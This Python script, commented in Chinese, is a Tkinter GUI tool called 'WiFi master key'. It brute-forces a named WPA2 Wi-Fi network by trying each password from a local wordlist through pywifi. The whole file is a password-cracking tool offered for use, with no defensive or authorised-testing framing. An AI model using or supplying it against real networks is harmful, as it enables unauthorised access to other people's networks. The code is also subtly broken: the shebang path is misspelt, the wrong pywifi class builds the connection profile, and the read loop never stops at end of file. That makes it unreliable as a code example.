#!/user/bin/env python3
#-*-  coding: utf-8 -*-
from tkinter import *
from pywifi import const
import pywifi
import time

"""
1.导入模块
2.获取第一个无线网卡
3.断开所有的wifi
4.读取密码本
5.设置睡眠时间-模拟连接
"""
#测试连接
def wifiConnect(str,wifiName):
    #创建一个窗口无线对象
    wifi = pywifi.PyWiFi()
    #抓取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    #断开所有wifi的连接
    ifaces.disconnect()
    #休息一秒
    time.sleep(1)

    #判断连接状态
    if ifaces.status() == const.IFACE_DISCONNECTED:
        #创建wifi连接文件
        proFile = pywifi.PyWiFi()

        """
        下面可以直接用
        """
        #添加wifi的名称
        proFile.ssid = wifiName
        #添加wifi的加密算法
        # proFile.akm.append(const.AKM_TYPE_WPA2PSK)
        proFile.akm =const.AKM_TYPE_WPA2PSK
        #wifi的密码
        proFile.key = str
        #网卡的开发
        proFile.auth = const.AUTH_ALG_OPEN

        #删除所有的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tepProFile = ifaces.add_network_profile(proFile)
        #连接
        ifaces.connect(tepProFile)
        time.sleep(4)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

    else:
        print("已经连接成功！")




#读取密码
def readPwd():
    #获取用户输入的wifi名称
    userInputWiFiName = entry.get()
    # print(userInputWiFiName)
    #获取密码本路径
    notePwdPath = r'F:\PycharmSave\firstGit\wifi密码本.txt'
    file = open(notePwdPath,"r")
    while True:
        try:
            #读取密码本 一行一行的读
            myStr = file.readline()
            # print(myStr)
            #测试连接
            bool = wifiConnect(myStr,userInputWiFiName)
            if bool:
                print("密码正确",myStr)
            else:
                # print("密码错误",myStr)
                #在列表框中打印 END表示添加到最后
                text.insert(END,"密码错误:"+myStr)
                #让文本滚动  让他一直显示最后一行
                text.see(END)
                #更新一下
                text.update()
        except:
            #跳出本次循环，执行下一次循环
            continue


#创建一个窗口对象
window = Tk()
#修改窗口显示的名字
window.title("WIFI万能钥匙")
#调整窗口的大小以及在屏幕中显示的位置 注意：大小是用x来表示  位置坐标用+来表示 他们都是用的geometry方法，所以可以组合在一起使用
window.geometry("500x400+400+200")

#标签控件 显示名称用text，
lable = Label(window, text = "输入要破解的wifi名称：")
#标签位置定位 grid网格式布局 pack 包 place 位置 三种定位 grid默认属性：row = 0 ，column = 0
lable.grid(row = 0, column = 0)

#输入标签   字体大小会影响输入框的高度
entry = Entry(window, font = ("微软雅黑",20))
entry.grid(row = 0, column = 1)

#列表框控件 Listbox
text = Listbox(window, font = ("微软雅黑",15), width = 40,height = 10)
#columnspan组建是所跨越的列数
text.grid(row = 1,columnspan = 2)

#按钮控件 button  再点击按钮的时候 肯定会触发一个事件用command
button = Button(window, text = "开始破解", width = 10, height = 2, command = readPwd)
button.grid(row = 2 ,columnspan = 2)
#显示窗口   mainloop()消息循环
window.mainloop()